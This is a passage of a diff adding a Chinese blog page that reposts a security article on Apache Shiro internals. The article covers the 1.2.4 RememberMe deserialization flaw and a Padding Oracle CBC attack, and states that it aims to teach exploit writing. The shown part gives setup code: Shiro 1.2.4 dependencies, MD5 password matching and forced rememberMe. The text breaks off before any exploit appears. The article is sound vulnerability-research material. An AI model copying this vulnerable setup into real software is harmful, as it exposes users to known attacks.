@@ -1,0 +1,1168 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Java反序列化,RCE,padding oracle cbc,Apache Shiro,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="【文章转载自先知社区： https://xz.aliyun.com/t/7207】 0x00 前言Apache Shiro is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management. W">
+<meta name="keywords" content="Java反序列化,RCE,padding oracle cbc,Apache Shiro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC">
+<meta property="og:url" content="http://yoursite.com/2020/02/21/Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC/index.html">
+<meta property="og:site_name" content="大彩笔threedr3am">
+<meta property="og:description" content="【文章转载自先知社区： https://xz.aliyun.com/t/7207】 0x00 前言Apache Shiro is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management. W">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-02-21T13:42:58.974Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC">
+<meta name="twitter:description" content="【文章转载自先知社区： https://xz.aliyun.com/t/7207】 0x00 前言Apache Shiro is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management. W">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/21/Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC/">
+
+
+
+
+
+  <title>Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC | 大彩笔threedr3am</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?8346bb07e7843cd10a2ee33017b3d627";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">大彩笔threedr3am</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/21/Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="threedr3am">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/avator/duolaAmeng.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="大彩笔threedr3am">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-21T21:38:00+08:00">
+                2020-02-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/java框架源码分析/" itemprop="url" rel="index">
+                    <span itemprop="name">java框架源码分析</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>【文章转载自先知社区： <a href="https://xz.aliyun.com/t/7207】" target="_blank" rel="noopener">https://xz.aliyun.com/t/7207】</a></p>
+<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>Apache Shiro is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management. With Shiro’s easy-to-understand API, you can quickly and easily secure any application – from the smallest mobile applications to the largest web and enterprise applications.</p>
+<p>Apache Shiro是一个功能强大且易于使用的Java安全框架，它执行身份验证、授权、加密和会话管理。通过Shiro易于理解的API，您可以快速、轻松地保护任何应用程序——从最小的移动应用程序到最大的web和企业应用程序。</p>
+<p>Apache Shiro框架功能主要由以下几个部分组成：</p>
+<ul>
+<li>Authentication：身份认证-登录</li>
+<li>Authorization：授权-权限验证</li>
+<li>Session Manager：会话管理</li>
+<li>Cryptography：加密</li>
+<li>Web Support：Web 支持</li>
+<li>Caching：缓存</li>
+<li>Concurrency：多线程</li>
+<li>Testing：测试模块</li>
+<li>Run As：允许一个用户假装为另一个用户</li>
+<li>Remember Me：记住我-Session过期后再次登录无需再次登录</li>
+</ul>
+<p>一个包含如此多功能模块的框架，我一向认为其必然存在着我们发现和未发现的安全漏洞，而事实也是如此，早在Shiro 1.2.4版本前，就被暴露了Cryptography模块因为默认AES加密key导致Remember Me模块的反序列化漏洞，在其被修复（每次启动都生成一个新的AES加密key）的几年后，依然是这个地方，出现了令我万万没想到的Padding Oracle漏洞，我一直以为这样的漏洞也就CTF会出现，这个洞也警醒了我，CTF每一个知识点，在真实漏洞挖掘中，都非常重要。</p>
+<p>而本篇文章，我将会用我一贯的源码浅析方式，对Apache Shiro的核心部分代码进行讲解，并且最后会以1.2.4版本的远古洞的触发原理，对源码进行深入的讲解，接着引出最新的Padding Oracle CBC Attack，从而让我们在看完这篇文章后，能熟悉的写出Shiro exploit，并对Shiro框架的主要原理聊熟于胸，还有最重要的一点是，现在网络上很多讲解漏洞的文章，都是简单的讲解漏洞，对这些框架的使用方法以及使用场景等都缺乏描述，对新手极度不友好，</p>
+<a id="more"></a>
+<h3 id="0x01-Shiro源码浅析"><a href="#0x01-Shiro源码浅析" class="headerlink" title="0x01 Shiro源码浅析"></a>0x01 Shiro源码浅析</h3><p>在进行源码浅析之前，我们先了解一下Shiro如何在一个SpringMVC项目中简单的使用。</p>
+<h4 id="1-Shiro简单使用"><a href="#1-Shiro简单使用" class="headerlink" title="1. Shiro简单使用"></a>1. Shiro简单使用</h4><p>我曾经在做Java开发的时候，我有幸为几个系统加入过Shiro框架，也对其功能不足处进行了一些简单的定制修改。</p>
+<p>曾经有个系统后台由于不满足等保要求，需要对其后台的登录验证进行重构，在其重构的过程中，我发现该后台只有单个硬编码的用户账号，而该账号被业务方大量的运营和开发人员使用，对于后台任何的配置和功能都能进行修改，这是一个极大的安全隐患，因此，我考虑在重构的后台系统中，加入了Shiro，为后台系统加入若干的特性，使其更加的安全坚固：</p>
+<ol>
+<li>多用户支持</li>
+<li>用户数据存库</li>
+<li>权限精细化-粒度到页面按钮</li>
+<li>用户禁用</li>
+<li>等等…</li>
+</ol>
+<p><strong>多用户支持</strong> 和 <strong>用户数据存库</strong>：原系统仅有单个硬编码账号，源码泄露将会导致账号密码泄露。而运营也是一个很大的不稳定因素，如果某个运营对一些关键配置进行了修改，将会威胁到系统的稳定运行。</p>
+<p><strong>权限精细化-粒度到页面按钮</strong>：前面也说了运营用户的潜在不稳定因素，所以加入了权限精细到页面按钮的的权限管理，可以控制每个运营人员具备的权限功能，对于一些涉及到系统安全的功能，我们就能更好的控制。</p>
+<p><strong>用户禁用</strong>：在后台系统中，我们会对每个账号的操作进行操作日志的持久化，如果我们发现某个账号进行了大量的敏感操作，存在安全风险，我们可以通过用户禁用功能对其账号进行快速的禁用。</p>
+<p>以上就是我对Shiro使用的一些简单总结，除此以外，还有很多，比如我曾经在某个古老的项目中使用Shiro后，没办法通过注解方式对接口方法进行权限的控制，最后得益于Shiro优秀的设计，通过一些比较特殊的方法达到方法级的权限控制等。</p>
+<p>在简述了我对Shiro的一些使用后，我们接下来就讲讲Shiro，如何去配置使用。</p>
+<h5 id="1-1-依赖（pom-xml）"><a href="#1-1-依赖（pom-xml）" class="headerlink" title="1.1 依赖（pom.xml）"></a>1.1 依赖（pom.xml）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;shiro-ehcache&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.4&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;net.sf.ehcache&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;ehcache-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.4.3&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.4&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.4&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.4&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="1-2-web配置（web-xml）"><a href="#1-2-web配置（web-xml）" class="headerlink" title="1.2 web配置（web.xml）"></a>1.2 web配置（web.xml）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- spring 配置--&gt;</span><br><span class="line">&lt;context-param&gt;</span><br><span class="line">    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">    &lt;param-value&gt;classpath:applicationContext.xml,classpath:spring-shiro.xml&lt;/param-value&gt;</span><br><span class="line">&lt;/context-param&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;spring&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">      &lt;param-value&gt;classpath:spring-servlet.xml,classpath:spring-shiro.xml&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;spring&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;!-- shiro的filter--&gt;</span><br><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;targetFilterLifecycle&lt;/param-name&gt;</span><br><span class="line">      &lt;param-value&gt;true&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line">&lt;!-- shiro的filter-mapping--&gt;</span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">&lt;/filter-mapping&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="1-3-shiro配置（spring-shiro-xml）"><a href="#1-3-shiro配置（spring-shiro-xml）" class="headerlink" title="1.3 shiro配置（spring-shiro.xml）"></a>1.3 shiro配置（spring-shiro.xml）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;!-- 开启shiro注解--&gt;</span><br><span class="line">    &lt;bean class=&quot;org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator&quot; depends-on=&quot;lifecycleBeanPostProcessor&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;proxyTargetClass&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean class=&quot;org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id=&quot;multipartResolver&quot; class=&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;maxUploadSize&quot; value=&quot;#&#123;10*1024*1024&#125;&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;maxInMemorySize&quot; value=&quot;4096&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;!-- 对应于web.xml中配置的那个shiroFilter --&gt;</span><br><span class="line">    &lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt;</span><br><span class="line">        &lt;!-- Shiro的核心安全接口，这个属性是必须的 --&gt;</span><br><span class="line">        &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt;</span><br><span class="line">        &lt;!-- 要求登录时的链接(登录页面地址)，非必须的属性，默认会自动寻找Web工程根目录下的&quot;/login.jsp&quot;页面 --&gt;</span><br><span class="line">        &lt;property name=&quot;loginUrl&quot; value=&quot;/jsp/login.jsp&quot;/&gt;</span><br><span class="line">        &lt;!-- 登录成功后要跳转的连接(本例中此属性用不到，因为登录成功后的处理逻辑在LoginController里硬编码) --&gt;</span><br><span class="line">        &lt;!-- &lt;property name=&quot;successUrl&quot; value=&quot;/&quot; &gt;&lt;/property&gt; --&gt;</span><br><span class="line">        &lt;!-- 用户访问未对其授权的资源时，所显示的连接 --&gt;</span><br><span class="line">        &lt;property name=&quot;unauthorizedUrl&quot; value=&quot;/html/error.html&quot;/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property name=&quot;filterChainDefinitions&quot;&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">                /html/admin/**=authc,roles[admin]</span><br><span class="line">                /html/user/**=user,roles[user]</span><br><span class="line">                /jsp/admin/**=authc,roles[admin]</span><br><span class="line">                /jsp/user/**=user,roles[user]</span><br><span class="line">                &lt;!--/dologin=ssl--&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean id=&quot;lifecycleBeanPostProcessor&quot; class=&quot;org.apache.shiro.spring.LifecycleBeanPostProcessor&quot;&gt;&lt;/bean&gt;</span><br><span class="line">    &lt;!-- 数据库保存的密码是使用MD5算法加密的，所以这里需要配置一个密码匹配对象 --&gt;</span><br><span class="line">    &lt;bean id=&quot;credentialsMatcher&quot; class=&quot;org.apache.shiro.authc.credential.Md5CredentialsMatcher&quot;&gt;&lt;/bean&gt;</span><br><span class="line">    &lt;!-- 缓存管理 --&gt;</span><br><span class="line">    &lt;bean id=&quot;shiroCacheManager&quot; class=&quot;org.apache.shiro.cache.MemoryConstrainedCacheManager&quot;&gt;&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 使用Shiro自带的JdbcRealm类 指定密码匹配所需要用到的加密对象 指定存储用户、角色、权限许可的数据源及相关查询语句 --&gt;</span><br><span class="line">    &lt;bean id=&quot;jdbcRealm&quot; class=&quot;org.apache.shiro.realm.jdbc.JdbcRealm&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;credentialsMatcher&quot; ref=&quot;credentialsMatcher&quot;&gt;&lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;permissionsLookupEnabled&quot; value=&quot;true&quot;&gt;&lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;&gt;&lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;authenticationQuery&quot; value=&quot;SELECT passwd FROM userTB WHERE login_name = ?&quot;&gt;&lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;userRolesQuery&quot; value=&quot;SELECT role_name from userTB left join roleTB using(role_id) WHERE login_name = ?&quot;&gt;&lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;permissionsQuery&quot; value=&quot;SELECT permission_name FROM permissionTB left join roleTB using(role_id) WHERE role_name = ?&quot;&gt;&lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;!-- Shiro安全管理器 --&gt;</span><br><span class="line">    &lt;bean id=&quot;securityManager&quot; class=&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;realm&quot; ref=&quot;jdbcRealm&quot;&gt;&lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;cacheManager&quot; ref=&quot;shiroCacheManager&quot;&gt;&lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="1-4-登录和注销接口"><a href="#1-4-登录和注销接口" class="headerlink" title="1.4 登录和注销接口"></a>1.4 登录和注销接口</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">@SessionAttributes(&quot;user&quot;)</span><br><span class="line">public class LoginAndLogoutController &#123;</span><br><span class="line">    @Autowired</span><br><span class="line">    private LoginAndLogoutService loginAndLogoutService;</span><br><span class="line">    @RequestMapping(value = &quot;/dologin&quot;,method = RequestMethod.POST)</span><br><span class="line">    public String doLogin(User user, ModelMap model)&#123;</span><br><span class="line">        System.out.println(&quot;用户&quot;+user.getLoginName()+&quot;正在登录........!&quot;);</span><br><span class="line">        return loginAndLogoutService.doLogin(user,model);</span><br><span class="line">    &#125;</span><br><span class="line">    @RequestMapping(value = &quot;/dologout&quot;,method = RequestMethod.GET)</span><br><span class="line">    public String doLogout(User user,ModelMap model)&#123;</span><br><span class="line">        System.out.println(&quot;用户&quot;+user.getLoginName()+&quot;正在注销........!&quot;);</span><br><span class="line">        return loginAndLogoutService.doLogout(model);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Service</span><br><span class="line">public class LoginAndLogoutService &#123;</span><br><span class="line">    @Autowired</span><br><span class="line">    private ApplicationContext applicationContext;</span><br><span class="line">    public String doLogin(User user, ModelMap model)&#123;</span><br><span class="line">        UsernamePasswordToken token = new UsernamePasswordToken(user.getLoginName(),user.getPasswd());</span><br><span class="line">        token.setRememberMe(true);</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line">        String msg;</span><br><span class="line">        try &#123;</span><br><span class="line">            subject.login(token);</span><br><span class="line">            if (subject.isAuthenticated()) &#123;</span><br><span class="line">                System.out.println(&quot;登录成功！&quot;);</span><br><span class="line">                UserDao userDao = (UserDao) applicationContext.getBean(&quot;userDao&quot;);</span><br><span class="line">                List&lt;User&gt; users = userDao.getUserByLoginName(user);</span><br><span class="line">                model.put(&quot;user&quot;, users.get(0));</span><br><span class="line">                if (subject.hasRole(&quot;admin&quot;)) &#123;</span><br><span class="line">                    return &quot;redirect:/html/admin/center.html&quot;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    return &quot;redirect:/html/user/center.html&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;catch (IncorrectCredentialsException e) &#123;</span><br><span class="line">            msg = &quot;登录密码错误. Password for account &quot; + token.getPrincipal() + &quot; was incorrect.&quot;;</span><br><span class="line">            model.addAttribute(&quot;message&quot;, msg);</span><br><span class="line">            